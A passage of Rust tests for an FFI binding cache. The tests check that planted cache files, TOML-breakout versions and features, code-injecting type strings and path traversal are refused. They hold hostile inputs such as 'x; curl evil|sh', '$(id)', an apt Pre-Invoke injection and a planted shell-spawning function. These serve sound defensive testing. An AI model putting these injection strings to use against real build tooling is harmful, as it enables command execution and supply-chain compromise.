        let mut doc: serde_json::Value = serde_json::from_str(&consumer).expect("json");
        if let Some(o) = doc.as_object_mut() {
            o.remove("transparentTypes");
            if let Some(bs) = o.get_mut("bindings").and_then(|b| b.as_array_mut()) {
                for b in bs {
                    if let Some(bo) = b.as_object_mut() {
                        bo.remove("transparentResult");
                    }
                }
            }
        }
        std::fs::write(&paths.consumer, serde_json::to_string_pretty(&doc).unwrap()).expect("w");
        let result = load_catalog(cache.root());
        assert!(
            result.is_err(),
            "torn transparent-define legacy cache must be refused"
        );
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn load_catalog_ignores_a_planted_bindings_file_and_re_derives() {
        let tmp =
            ipe_test_temp::temp_root().join(format!("ipe-ffi-plant-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        let cache = FfiCache::at_project_root(&tmp);
        let (_pkg, paths) = install_from_inspection(&cache, &semver_json()).expect("installs");
        // Plant an injected wrapper body into the stored _bindings.rs (door (a)
        // — a hand-edited cache file). It reaches a REACHED wrapper region.
        let planted = std::fs::read_to_string(&paths.bindings)
            .expect("readable")
            .replace(
                "pub fn semver_parse",
                "pub fn pwned(){ std::process::Command::new(\"sh\"); } pub fn semver_parse",
            );
        std::fs::write(&paths.bindings, &planted).expect("plant");
        // load_catalog re-derives from pkg.json, so the planted text is inert.
        let catalog = load_catalog(cache.root()).expect("loads");
        let c = catalog.first().expect("one crate");
        assert!(
            !c.bindings_source.contains("pwned"),
            "the planted injection must NOT survive re-derivation:\n{}",
            c.bindings_source
        );
        assert!(
            c.bindings_source.contains("pub fn semver_parse"),
            "the real wrapper is re-derived"
        );
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn divergent_projection_files_are_inert_under_pkg_json() {
        // A projection claiming a member the authoritative catalog lacks
        // (torn write, mixed-run cache, hand edit) must never reach the
        // loaded view: everything re-derives from pkg.json.
        let tmp =
            ipe_test_temp::temp_root().join(format!("ipe-ffi-diverge-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        let cache = FfiCache::at_project_root(&tmp);
        let (_pkg, paths) = install_from_inspection(&cache, &semver_json()).expect("installs");
        let baseline = load_catalog(cache.root()).expect("loads");
        let base = baseline.first().expect("one crate");
        // Plant a phantom binding into the consumer manifest and a phantom
        // forwarder into the interface module.
        let consumer = std::fs::read_to_string(&paths.consumer)
            .expect("readable")
            .replace(
                "\"bindings\": [",
                "\"bindings\": [{\"refName\": \"phantom\", \"wrapperIdent\": \
                 \"semver_phantom\", \"arity\": 1, \"sig\": \"String -> String\"},",
            );
        std::fs::write(&paths.consumer, consumer).expect("plant consumer");
        let mut iface = std::fs::read_to_string(&paths.interface).expect("readable");
        iface.push_str(
            "phantom : String -> String\nphantom a0 =\n    Ffi.binding \"semver_phantom\" a0\n",
        );
        std::fs::write(&paths.interface, iface).expect("plant interface");
        let reloaded = load_catalog(cache.root()).expect("loads");
        let c = reloaded.first().expect("one crate");
        assert_eq!(c, base, "planted projections must not change the view");
        assert!(
            !c.interface_source.contains("phantom"),
            "the phantom forwarder must not survive re-derivation"
        );
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn load_catalog_rejects_an_injection_bearing_planted_pkg_json() {
        let tmp =
            ipe_test_temp::temp_root().join(format!("ipe-ffi-badpkg-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        let cache = FfiCache::at_project_root(&tmp);
        let (_pkg, paths) = install_from_inspection(&cache, &semver_json()).expect("installs");
        // Overwrite pkg.json with an inspection doc carrying an injection in a
        // rustType — the re-decode must fail closed (the whole crate refuses,
        // never emits the injection).
        let evil = json!({
            "pkg": "semver",
            "name": "semver",
            "version": "1.0.26",
            "functions": [{
                "name": "parse",
                "params": [{"name": "text", "type": "String", "rustType": "&str; std::process::exit(1)"}],
                "results": [{"name": "", "type": "u64"}],
                "effect": "pure"
            }],
            "errors": []
        })
        .to_string();
        std::fs::write(&paths.pkg_json, &evil).expect("plant pkg.json");
        // Two guarantees hold regardless of which artifacts an attacker
        // controls: (1) if the load succeeds, the injection never reaches the
        // re-derived bindings (the rustType drops its binding at decode); (2)
        // if the consumer manifest still forwards to the now-missing wrapper,
        // the cross-check fails the load closed. Either way the injection is
        // never emitted — assert the injection text is absent from any emitted
        // bindings and that the outcome is one of the two safe shapes.
        let loaded = load_catalog(cache.root());
        let injection_absent = match &loaded {
            Ok(catalog) => catalog
                .iter()
                .all(|c| !c.bindings_source.contains("std::process::exit")),
            Err(Diagnostic::WireMalformed { .. }) => true,
            Err(_) => false,
        };
        assert!(
            injection_absent,
            "an injection-bearing pkg.json must never emit the injection: {loaded:?}"
        );
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn slug_is_lowercase_alnum_underscore() {
        assert_eq!(slugify("semver"), "semver");
        assert_eq!(slugify("Serde-Json"), "serde_json");
    }

    // ── manifest lines ──────────────────────────────────────────────────

    #[test]
    fn dep_lines_are_pinned_exact_with_primary_features() {
        let lines = cargo_dep_lines(&semver_pkg(), &registry_cache()).expect("renders");
        assert_eq!(
            lines,
            vec![
                "semver = { version = \"=1.0.26\", features = [\"std\"] }",
                "serde-json = \"=1.0.145\"",
            ]
        );
        // No wildcard anywhere, ever.
        assert!(lines.iter().all(|l| !l.contains('*')));
    }

    #[test]
    fn dep_line_without_a_resolved_version_fails_loudly() {
        let pkg = PkgInfo::decode_json(
            &json!({
                "pkg": "semver",
                "name": "semver",
                "functions": [],
                "errors": [],
                "transitiveDeps": [{"ident": "semver", "name": "semver", "version": ""}]
            })
            .to_string(),
        )
        .expect("decodes");
        assert!(cargo_dep_lines(&pkg, &registry_cache()).is_err());
    }

    #[test]
    fn primary_line_falls_back_to_the_package_header_when_no_probe_data() {
        let pkg = PkgInfo::decode_json(
            &json!({
                "pkg": "serde_json",
                "name": "serde_json",
                "version": "1.0.145",
                "functions": [],
                "errors": []
            })
            .to_string(),
        )
        .expect("decodes");
        // The dependency KEY is the charset-gated package NAME (`pkg.name()`),
        // not the weakly gated `pkg_path` — the underscore form is the crate's
        // own package name and a valid Cargo `[dependencies]` key.
        assert_eq!(
            cargo_dep_lines(&pkg, &registry_cache()).expect("renders"),
            vec!["serde_json = \"=1.0.145\""]
        );
    }

    #[test]
    fn primary_line_preserves_a_dashed_package_name_verbatim() {
        // A published crate whose real package name carries a dash (`handle-demo`)
        // must key the Cargo `[dependencies]` line with that verbatim dashed name,
        // not a dash-to-underscore normalisation. Cargo maps the dashed KEY to the
        // `handle_demo` extern ident on its own, so the emitted bindings' `use
        // ::handle_demo::` resolves against a `handle-demo = "=..."` dependency.
        // A `PackageName` preserves both `-` and `_`, so the dep KEY is the real
        // registry name and the dependency resolves.
        let pkg = PkgInfo::decode_json(
            &json!({
                "pkg": "handle_demo",
                "name": "handle-demo",
                "version": "0.1.0",
                "functions": [],
                "errors": []
            })
            .to_string(),
        )
        .expect("decodes");
        assert_eq!(
            cargo_dep_lines(&pkg, &registry_cache()).expect("renders"),
            vec!["handle-demo = \"=0.1.0\""]
        );
    }

    #[test]
    fn an_injection_bearing_version_never_reaches_a_manifest_line() {
        // An inspection whose resolved version carries a TOML-string-breakout
        // payload must be REFUSED at decode — the version can never reach
        // `CargoDep::render`, so no emitted `Cargo.toml` line can carry the
        // injection. (The type-level guarantee: `CargoDep` holds a
        // `CrateVersion`, and the only constructor is the decode-boundary
        // parse, so an un-parsed string is unrepresentable at emission.)
        let evil = "1.0\", features=[\"net\"] }\n[dependencies.evil]\npath = \"/etc";
        let decoded = PkgInfo::decode_json(
            &json!({
                "pkg": "semver",
                "name": "semver",
                "version": evil,
                "functions": [],
                "errors": []
            })
            .to_string(),
        );
        assert!(
            matches!(
                decoded,
                Err(Diagnostic::WireMalformed {
                    defect: crate::diag::WireDefect::InvalidVersion { .. },
                    ..
                })
            ),
            "an injection-bearing version must fail closed at decode: {decoded:?}"
        );
    }

    #[test]
    fn an_injection_bearing_feature_never_reaches_a_manifest_line() {
        // An inspection whose effective feature set carries a TOML-array
        // breakout payload must be REFUSED at decode — the feature can never
        // reach `CargoDep::render`, so no emitted `Cargo.toml` line can carry
        // the injection. (`CargoDep` holds `FeatureName`s, whose only
        // constructor is the decode-boundary parse.)
        let evil = "std\"]}\n[dependencies.evil]\npath = \"/tmp/evil\nx = [\"";
        let decoded = PkgInfo::decode_json(
            &json!({
                "pkg": "semver",
                "name": "semver",
                "version": "1.0.26",
                "functions": [],
                "errors": [],
                "features": [evil]
            })
            .to_string(),
        );
        assert!(
            matches!(
                decoded,
                Err(Diagnostic::WireMalformed {
                    defect: crate::diag::WireDefect::InvalidFeature { .. },
                    ..
                })
            ),
            "an injection-bearing feature must fail closed at decode: {decoded:?}"
        );
    }

    #[test]
    fn an_injection_bearing_pkg_path_never_reaches_a_manifest_line() {
        // `pkg_path` is only weakly gated (control chars refused, but `"`, `{`,
        // `}`, `[`, `]`, space admitted) because it is a crate name OR a
        // `--manifest` filesystem path. It MUST NOT be the source of the Cargo
        // `[dependencies]` KEY: the key is derived from the charset-gated
        // `PackageName` (`pkg.name_pkg()`), so a hostile `pkg` value cannot reach
        // the unescaped TOML key position. Here a legal-charset `name` decodes,
        // an injection-bearing `pkg` rides along, and the emitted key is the
        // clean package name — the hostile path never appears in any line.
        let evil_pkg = "semver\", x = \"{ evil }";
        let pkg = PkgInfo::decode_json(
            &json!({
                "pkg": evil_pkg,
                "name": "semver",
                "version": "1.0.145",
                "functions": [],
                "errors": []
            })
            .to_string(),
        )
        .expect("a legal package name decodes even when pkg_path is hostile");
        let lines = cargo_dep_lines(&pkg, &registry_cache()).expect("renders");
        assert_eq!(lines, vec!["semver = \"=1.0.145\""]);
        assert!(
            lines.iter().all(|l| !l.contains(evil_pkg)),
            "the weakly-gated pkg_path must never reach a manifest line: {lines:?}"
        );
    }

    #[test]
    fn a_legal_feature_set_reaches_a_pinned_manifest_line() {
        // The whole point of the gate is to KEEP legal features working: a
        // primary crate with a real feature set must still render a pinned,
        // well-formed dependency line carrying that feature.
        let pkg = PkgInfo::decode_json(
            &json!({
                "pkg": "tokio",
                "name": "tokio",
                "version": "1.0.0",
                "functions": [],
                "errors": [],
                "features": ["rt-multi-thread"]
            })
            .to_string(),
        )
        .expect("legal feature set decodes");
        let lines = cargo_dep_lines(&pkg, &registry_cache()).expect("renders a manifest line");
        assert_eq!(
            lines,
            ["tokio = { version = \"=1.0.0\", features = [\"rt-multi-thread\"] }"]
        );
    }

    // ── sentinel DCE ────────────────────────────────────────────────────

    #[test]
    fn shake_keeps_preamble_and_reached_regions_only() {
        let pkg = semver_pkg();
        let full = crate::bindings::emit_bindings(&pkg);
        let reached = BTreeSet::from(["parse".to_owned()]);
        let shaken = shake_bindings(&full, &reached);
        // Preamble survives (fence + uses).
        assert!(shaken.contains("compile_error!"), "{shaken}");
        assert!(shaken.contains("use crate::*;"), "{shaken}");
        // The reached wrapper survives with its sentinels.
        assert!(
            shaken.contains("// IPE-FFI-WRAPPER BEGIN parse"),
            "{shaken}"
        );
        assert!(shaken.contains("pub fn semver_parse"), "{shaken}");
        // An unreached wrapper is gone.
        let none: BTreeSet<String> = BTreeSet::new();
        let empty = shake_bindings(&full, &none);
        assert!(!empty.contains("pub fn semver_parse"), "{empty}");
        assert!(empty.contains("use crate::*;"), "{empty}");
        // Shaking with everything reached is the identity on regions.
        let all = BTreeSet::from(["parse".to_owned()]);
        assert_eq!(shake_bindings(&full, &all), shaken);
    }

    #[test]
    fn trust_summary_names_the_compile_decision() {
        let krate = CrateName::parse("semver").expect("legal");
        let s = trust_summary(&krate, "1.0.26", None, 12);
        assert!(s.contains("semver"), "{s}");
        assert!(s.contains("1.0.26"), "{s}");
        assert!(s.contains("12"), "{s}");
        assert!(s.contains("COMPILE"), "{s}");
    }

    #[test]
    fn detect_missing_system_lib_parses_primary_form() {
        // The primary form emitted by `pkg_config` build scripts:
        // "The system library `<lib>` required by crate `<crate>` was not found."
        let errors = vec![
            "cargo:rerun-if-env-changed=WAYLAND_SYS_STATIC".to_owned(),
            "The system library `wayland-client` required by crate `wayland-sys` was not found."
                .to_owned(),
        ];
        let got = detect_missing_system_lib(&errors).expect("must detect");
        assert_eq!(got.system_lib.as_str(), "wayland-client");
        assert_eq!(
            got.crate_name.as_ref().map(CrateName::as_str),
            Some("wayland-sys")
        );
    }

    #[test]
    fn detect_missing_system_lib_parses_pkg_config_form() {
        // The secondary form from pkg-config itself.
        let errors = vec![
            "Package 'wayland-client' was not found in the pkg-config search path.".to_owned(),
        ];
        let got = detect_missing_system_lib(&errors).expect("must detect");
        assert_eq!(got.system_lib.as_str(), "wayland-client");
    }

    #[test]
    fn detect_missing_system_lib_returns_none_for_unrelated_errors() {
        let errors = vec![
            "error[E0277]: the trait bound `Foo: Bar` is not satisfied".to_owned(),
            "panicked at 'called `Option::unwrap()` on a `None` value'".to_owned(),
        ];
        assert!(
            detect_missing_system_lib(&errors).is_none(),
            "unrelated errors must not be misidentified as a missing system lib"
        );
    }

    #[test]
    fn install_hint_for_returns_curated_hint_for_known_lib() {
        let hint = install_hint_for(&SysLibName::parse("wayland-client").expect("legal name"));
        assert!(hint.contains("wayland"), "{hint}");
        assert!(hint.contains("apt"), "{hint}");
    }

    #[test]
    fn install_hint_for_returns_generic_fallback_for_unknown_lib() {
        let hint =
            install_hint_for(&SysLibName::parse("some-obscure-lib-xyz").expect("legal name"));
        assert!(
            hint.contains("some-obscure-lib-xyz"),
            "fallback must mention the lib name: {hint}"
        );
        assert!(hint.contains("-dev"), "fallback must mention -dev: {hint}");
    }

    #[test]
    fn summarise_inspector_errors_extracts_root_cause_line() {
        let errors = vec![
            "cargo:rerun-if-env-changed=PKG_CONFIG_ALLOW_SYSTEM_LIBS".to_owned(),
            "cargo:rerun-if-env-changed=PKG_CONFIG_PATH".to_owned(),
            "error[E0277]: the trait bound is not satisfied".to_owned(),
            "  --> src/lib.rs:10:5".to_owned(),
        ];
        let summary = summarise_inspector_errors(&errors);
        assert!(
            summary.contains("E0277"),
            "must extract the rustc error line: {summary}"
        );
        assert!(
            !summary.contains("cargo:rerun"),
            "noise lines must be dropped: {summary}"
        );
    }

    // ── strip_foreign_str ────────────────────────────────────────────────

    #[test]
    fn strip_foreign_str_passes_plain_ascii_through() {
        assert_eq!(
            strip_foreign_str("error: trait bound not satisfied"),
            "error: trait bound not satisfied"
        );
    }

    #[test]
    fn strip_foreign_str_removes_csi_colour_sequences() {
        // rustc emits bold-red `error:` via ESC[1;31m … ESC[0m.
        let coloured = "\x1b[1;31merror\x1b[0m: trait bound";
        assert_eq!(strip_foreign_str(coloured), "error: trait bound");
    }

    #[test]
    fn strip_foreign_str_removes_osc_hyperlink_sequences() {
        // Some terminal emulators emit OSC 8 hyperlinks in diagnostic output.
        let with_osc = "before\x1b]8;;https://example.com\x07click\x1b]8;;\x07after";
        assert_eq!(strip_foreign_str(with_osc), "beforeclickafter");
    }

    #[test]
    fn strip_foreign_str_drops_every_control_char_and_layout_whitespace() {
        // NUL (\x00), BEL (\x07), US (\x1f), and the tab and line break a
        // block renderer would keep are all stripped from an inline value.
        let s = "a\x00b\x07c\td\x1fe\nf";
        assert_eq!(strip_foreign_str(s), "abcdef");
    }

    #[test]
    fn summarise_strips_ansi_from_foreign_rustc_stderr() {
        // A rustc error line with ANSI colour codes must be stripped before it
        // reaches the diagnostic — the raw sequence must not appear in the output.
        let errors =
            vec!["\x1b[1;31merror\x1b[0m[E0277]: the trait bound is not satisfied".to_owned()];
        let summary = summarise_inspector_errors(&errors);
        assert!(
            !summary.contains('\x1b'),
            "ANSI escape sequences must be stripped from the summary: {summary}"
        );
        assert!(
            summary.contains("E0277"),
            "the error code must survive stripping: {summary}"
        );
    }

    #[test]
    #[allow(clippy::panic)]
    fn install_from_inspection_returns_typed_system_lib_diagnostic() {
        let json = serde_json::json!({
            "pkg": "wayland",
            "name": "wayland",
            "version": "0.31.0",
            "functions": [],
            "errors": [
                "The system library `wayland-client` required by crate `wayland-sys` was not found."
            ]
        })
        .to_string();
        let tmp =
            ipe_test_temp::temp_root().join(format!("ipe-ffi-syslib-test-{}", std::process::id()));
        let cache = FfiCache::at_project_root(&tmp);
        let err = install_from_inspection(&cache, &json).expect_err("must fail");
        match err {
            crate::diag::Diagnostic::SystemLibraryNotFound {
                system_lib,
                crate_name,
                ..
            } => {
                assert_eq!(system_lib.as_str(), "wayland-client");
                assert_eq!(crate_name, "wayland-sys");
            }
            other => panic!("expected SystemLibraryNotFound, got {other:?}"),
        }
    }

    #[test]
    fn summarise_truncates_a_long_root_line_at_a_char_boundary_without_panicking() {
        // A root-cause line past the 200-char cap whose multibyte chars straddle
        // the byte-200 boundary — a byte slice at 200 would panic mid-`€`.
        let long = format!("error: {}{}", "x".repeat(190), "€".repeat(20));
        let out = summarise_inspector_errors(&[long]);
        assert!(out.ends_with('…'), "long line is truncated: {out}");
        assert_eq!(out.chars().count(), 201, "200 chars plus the ellipsis");
    }

    #[test]
    fn detect_missing_system_lib_strips_control_bytes_from_extracted_names() {
        // Raw build-script stderr could carry an ANSI escape (0x1b) or DEL (0x7f)
        // inside a name; these must be gone before the name reaches the terminal.
        let line =
            "The system library `way\u{1b}land` required by crate `wl\u{7f}sys` was not found."
                .to_owned();
        let got = detect_missing_system_lib(&[line]).expect("signature matches");
        // `ESC l` is a two-byte escape sequence, dropped whole like every
        // escape `TerminalSafe` strips.
        assert_eq!(got.system_lib.as_str(), "wayand");
        assert_eq!(
            got.crate_name.as_ref().map(CrateName::as_str),
            Some("wlsys")
        );
        assert!(!got.system_lib.as_str().contains('\u{1b}'));
    }

    #[test]
    fn detect_missing_system_lib_strips_denied_format_chars_from_extracted_names() {
        // A zero-width space (a denied format character, not a control byte)
        // hidden inside a name must be gone before the name reaches the
        // terminal or the parser.
        let line = "Package 'wayland\u{200B}-client' was not found in the pkg-config search path."
            .to_owned();
        let got = detect_missing_system_lib(&[line]).expect("signature matches");
        assert_eq!(got.system_lib.as_str(), "wayland-client");
        assert!(!got.system_lib.as_str().contains('\u{200B}'));
    }

    /// A library name outside the `pkg-config` charset never reaches an install hint.
    #[test]
    fn a_hostile_system_lib_name_yields_no_install_hint() {
        let over_length = "a".repeat(SYS_LIB_NAME_MAX_LEN + 1);
        let hostile = [
            "x; curl evil|sh",
            "$(id)",
            "`id`",
            "lib foo",
            "-o APT::Update::Pre-Invoke::=id",
            over_length.as_str(),
        ];
        for name in hostile {
            assert_eq!(SysLibName::parse(name), None, "{name:?} parsed");
            let primary =
                format!("The system library `{name}` required by crate `evil-sys` was not found.");
            assert_eq!(
                detect_missing_system_lib(&[primary]),
                None,
                "{name:?} detected"
            );
            let secondary =
                format!("Package '{name}' was not found in the pkg-config search path.");
            assert_eq!(
                detect_missing_system_lib(&[secondary]),
                None,
                "{name:?} detected"
            );
        }
        let longest = "a".repeat(SYS_LIB_NAME_MAX_LEN);
        assert!(
            SysLibName::parse(&longest).is_some(),
            "the bound itself is legal"
        );
        assert!(SysLibName::parse("gtk+-3.0").is_some());
        assert!(SysLibName::parse("libpipewire-0.3").is_some());
    }

    /// A hostile library name surfaces as the summarised inspector failure, never as a hint.
    #[test]
    fn install_from_inspection_gives_no_hint_for_a_hostile_system_lib() {
        let json = serde_json::json!({
            "pkg": "evil",
            "name": "evil",
            "version": "0.1.0",
            "functions": [],
            "errors": [
                "The system library `x; curl evil|sh` required by crate `evil-sys` was not found."
            ]
        })
        .to_string();
        let tmp = ipe_test_temp::temp_root()
            .join(format!("ipe-ffi-syslib-hostile-{}", std::process::id()));
        let cache = FfiCache::at_project_root(&tmp);
        let err = install_from_inspection(&cache, &json).expect_err("must fail");
        assert!(
            matches!(err, crate::diag::Diagnostic::WireMalformed { .. }),
            "expected a summarised failure, got {err:?}"
        );
    }

    /// A crate name that does not parse falls back to the inspected package's name.
    #[test]
    fn a_hostile_crate_name_falls_back_to_the_package_name() {
        let line = "The system library `zlib` required by crate `a b;c` was not found.".to_owned();
        let got = detect_missing_system_lib(&[line]).expect("library parses");
        assert_eq!(got.crate_name, None);
    }

    #[test]
    fn inspection_error_log_returns_the_channel_and_tolerates_garbage() {
        let json = serde_json::json!({
            "pkg": "demo", "name": "demo", "version": "0.1.0",
            "functions": [],
            "errors": ["error: boom", "note: detail"]
        })
        .to_string();
        assert_eq!(
            inspection_error_log(&json),
            vec!["error: boom".to_owned(), "note: detail".to_owned()]
        );
        assert!(inspection_error_log("not json at all").is_empty());
    }

    // ── opaque-type cache boundary ───────────────────────────────────────

    /// The guard added at the `opaqueTypes` cache boundary: valid Rust paths
    /// are accepted; injection-bearing or structurally illegal paths are
    /// rejected as `WireMalformed` before reaching the emitter.
    #[test]
    fn opaque_types_decode_rejects_injection_bearing_paths() {
        // Verify the exact parse gate the decode loop applies.
        let good = ["::semver::Version", "::crate_name::Type", "MyType"];
        for s in good {
            assert!(
                crate::naming::RustPathSegment::parse(s).is_ok(),
                "valid path `{s}` must parse"
            );
        }
        let bad = [
            "::semver::Version; std::process::exit(0)",
            "a b",
            "",
            "a\nb",
            "a{b}",
        ];
        for s in bad {
            assert!(
                crate::naming::RustPathSegment::parse(s).is_err(),
                "injection-bearing path `{s}` must be rejected at decode"
            );
        }
    }

    // ── opaqueTypeIds cache boundary (fail-closed) ───────────────────────

    /// Write a legacy consumer-JSON cache (no `.pkg.json`) into a temp dir
    /// and return the cache root path, so `load_catalog` exercises the
    /// consumer-JSON decode path (the one that was fail-open on `opaqueTypeIds`).
    fn write_legacy_cache(test_name: &str, consumer_json: &str) -> std::path::PathBuf {
        let root = ipe_test_temp::temp_root()
            .join(format!("ipe-ffi-legacy-{test_name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).expect("create cache dir");
        // Write the minimum artifacts the legacy path reads (no `.pkg.json`).
        std::fs::write(root.join("semver.consumer.json"), consumer_json)
            .expect("write consumer.json");
        // Use the opaque-placeholder form — `type N = N` — so the interface
        // does not surface a transparent record (no `type alias`, no `(..)`),
        // and the transparentTypes cross-check passes even when the field is absent.
        std::fs::write(
            root.join("semver.ipe"),
            "module Rust.Semver exposing (Version)\ntype Version = Version\n",
        )
        .expect("write interface");
        std::fs::write(root.join("semver_bindings.rs"), "// autogenerated\n")
            .expect("write bindings");
        root
    }

    /// A non-string value in `opaqueTypeIds` must be a typed `WireMalformed`
    /// refusal — the old `decode_str_map` helper silently dropped non-string
    /// values, leaving the map entry absent instead of refusing the manifest.
    #[test]
    fn opaque_type_ids_non_string_value_is_rejected() {
        let consumer = json!({
            "moduleName": "Rust.Semver",
            "kernelName": "Rust_Semver",
            "opaqueTypes": { "Version": "::semver::Version" },
            "opaqueTypeIds": { "Version": 42 },
            "defineTypes": [],
            "cargoDeps": [],
            "bindings": []
        })
        .to_string();
        let cache_root = write_legacy_cache("ids_reject", &consumer);
        let err = load_catalog(&cache_root)
            .expect_err("a non-string opaqueTypeIds value must be a typed WireMalformed refusal");
        assert!(
            matches!(err, Diagnostic::WireMalformed { .. }),
            "expected WireMalformed, got: {err:?}"
        );
        let _ = std::fs::remove_dir_all(&cache_root);
    }

    /// An absent `opaqueTypeIds` field is accepted — older caches omit it.
    #[test]
    fn opaque_type_ids_absent_field_accepted_for_legacy_caches() {
        let consumer = json!({
            "moduleName": "Rust.Semver",
            "kernelName": "Rust_Semver",
            "opaqueTypes": { "Version": "::semver::Version" },
            "defineTypes": [],
            "cargoDeps": [],
            "bindings": []
        })
        .to_string();
        let cache_root = write_legacy_cache("ids_absent", &consumer);
        let catalog = load_catalog(&cache_root)
            .expect("absent opaqueTypeIds must be accepted for legacy-cache compat");
        assert_eq!(catalog.len(), 1);
        let entry = catalog.first().expect("catalog must have one entry");
        assert!(
            entry.opaque_type_ids.is_empty(),
            "an absent opaqueTypeIds field yields an empty map"
        );
        let _ = std::fs::remove_dir_all(&cache_root);
    }

    /// A minimal wrapper-crate inspection bound at `wrapper_path`.
    fn wrapper_pkg(wrapper_path: &str) -> Result<PkgInfo, Diagnostic> {
        PkgInfo::decode_json(
            &json!({
                "pkg": "engine_wrap",
                "name": "engine_wrap",
                "version": "0.1.0",
                "wrapperPath": wrapper_path,
                "functions": [],
                "errors": []
            })
            .to_string(),
        )
    }

    /// The `Cargo.toml` of the scratch `engine_wrap` wrapper crate.
    const ENGINE_MANIFEST: &str = "[package]\nname = \"engine_wrap\"\nversion = \"0.1.0\"\n";

    /// A scratch project root holding the `engine_wrap` crate at
    /// `wrappers/engine`, plus the canonical form of that wrapper directory.
    fn scratch_project(test_name: &str) -> (PathBuf, PathBuf) {
        let project = ipe_test_temp::temp_root()
            .join(format!("ipe-ffi-jail-{test_name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&project);
        std::fs::create_dir_all(project.join("wrappers/engine")).expect("scratch wrapper dir");
        std::fs::write(project.join("wrappers/engine/Cargo.toml"), ENGINE_MANIFEST)
            .expect("scratch wrapper manifest");
        let canonical =
            std::fs::canonicalize(project.join("wrappers/engine")).expect("canonicalizes");
        (project, canonical)
    }

    /// The `path` value of a rendered wrapper line, read back by a TOML parser.
    fn parsed_path(line: &str) -> Option<String> {
        let table: toml::Table = toml::from_str(line).ok()?;
        table
            .get("engine_wrap")?
            .get("path")?
            .as_str()
            .map(str::to_owned)
    }

    /// The manifest defect a wrapper load was refused with, if any.
    fn manifest_defect<T>(
        r: &Result<T, Diagnostic>,
    ) -> Option<&crate::diag::WrapperManifestDefect> {
        let Some(crate::diag::WireDefect::WrapperManifest { defect, .. }) = jail_defect(r) else {
            return None;
        };
        Some(defect)
    }

    /// Load the scratch wrapper after replacing its `Cargo.toml` with `manifest`.
    fn load_with_manifest(test_name: &str, manifest: &[u8]) -> Result<Vec<CargoDep>, Diagnostic> {
        let (project, canonical) = scratch_project(test_name);
        std::fs::write(canonical.join("Cargo.toml"), manifest).expect("scratch manifest");
        let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
        let r = cargo_deps(&pkg, &FfiCache::at_project_root(&project));
        let _ = std::fs::remove_dir_all(&project);
        r
    }

    fn jail_defect<T>(r: &Result<T, Diagnostic>) -> Option<&crate::diag::WireDefect> {
        let Err(Diagnostic::WireMalformed { defect, .. }) = r else {
            return None;
        };
        Some(defect)
    }

    #[test]
    fn empty_wrapper_path_decodes_as_registry_source() {
        let pkg = semver_pkg();
        assert_eq!(pkg.source(), &crate::pkginfo::PkgSource::Registry);
        let wrapped = wrapper_pkg("wrappers/engine").expect("decodes");
        assert!(matches!(
            wrapped.source(),
            crate::pkginfo::PkgSource::Wrapper(p) if p.as_str() == "wrappers/engine"
        ));
    }

    #[test]
    fn wrapper_path_with_parent_segment_is_refused_at_decode() {
        for got in ["../outside", "wrappers/../../outside", "wrappers/.."] {
            let r = wrapper_pkg(got);
            assert!(
                matches!(
                    r,
                    Err(Diagnostic::WireMalformed {
                        defect: crate::diag::WireDefect::WrapperPathTraversal { .. },
                        ..
                    })
                ),
                "`{got}` must be refused as traversal: {r:?}"
            );
        }
    }

    #[test]
    fn relative_wrapper_path_inside_the_root_renders_canonical() {
        let (project, canonical) = scratch_project("rel-ok");
        let text = canonical.to_str().expect("utf-8 temp path");
        let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
        let deps = cargo_dep_lines(&pkg, &FfiCache::at_project_root(&project));
        let _ = std::fs::remove_dir_all(&project);
        let deps = deps.expect("jails inside the root");
        assert_eq!(
            deps,
            [format!(
                "engine_wrap = {{ path = {} }}",
                toml_basic_string(text)
            )]
        );
        assert_eq!(
            deps.first().and_then(|line| parsed_path(line)).as_deref(),
            Some(text)
        );
    }

    #[test]
    fn absolute_wrapper_path_inside_the_root_is_accepted() {
        let (project, canonical) = scratch_project("abs-ok");
        let text = canonical.to_str().expect("utf-8 temp path").to_owned();
        let pkg = wrapper_pkg(&text).expect("decodes");
        let deps = cargo_dep_lines(&pkg, &FfiCache::at_project_root(&project));
        let _ = std::fs::remove_dir_all(&project);
        assert_eq!(
            deps.expect("jails inside the root"),
            [format!(
                "engine_wrap = {{ path = {} }}",
                toml_basic_string(&text)
            )]
        );
    }

    #[test]
    fn absolute_wrapper_path_outside_the_root_is_refused() {
        let (project, _) = scratch_project("abs-out");
        let (elsewhere, outside) = scratch_project("abs-out-elsewhere");
        let pkg = wrapper_pkg(outside.to_str().expect("utf-8 temp path")).expect("decodes");
        let r = cargo_dep_lines(&pkg, &FfiCache::at_project_root(&project));
        let _ = std::fs::remove_dir_all(&project);
        let _ = std::fs::remove_dir_all(&elsewhere);
        assert!(
            matches!(
                jail_defect(&r),
                Some(crate::diag::WireDefect::WrapperPathOutsideRoot { .. })
            ),
            "{r:?}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn symlinked_wrapper_dir_escaping_the_root_is_refused() {
        let (project, _) = scratch_project("symlink");
        let (elsewhere, outside) = scratch_project("symlink-elsewhere");
        std::os::unix::fs::symlink(&outside, project.join("wrappers/link")).expect("symlink");
        let pkg = wrapper_pkg("wrappers/link").expect("decodes");
        let r = cargo_dep_lines(&pkg, &FfiCache::at_project_root(&project));
        let _ = std::fs::remove_dir_all(&project);
        let _ = std::fs::remove_dir_all(&elsewhere);
        assert!(
            matches!(
                jail_defect(&r),
                Some(crate::diag::WireDefect::WrapperPathOutsideRoot { .. })
            ),
            "{r:?}"
        );
    }

    #[test]
    fn missing_wrapper_dir_is_refused() {
        let (project, _) = scratch_project("missing");
        let pkg = wrapper_pkg("wrappers/gone").expect("decodes");
        let r = cargo_dep_lines(&pkg, &FfiCache::at_project_root(&project));
        let _ = std::fs::remove_dir_all(&project);
        assert!(
            matches!(
                jail_defect(&r),
                Some(crate::diag::WireDefect::WrapperPathUnresolvable { .. })
            ),
            "{r:?}"
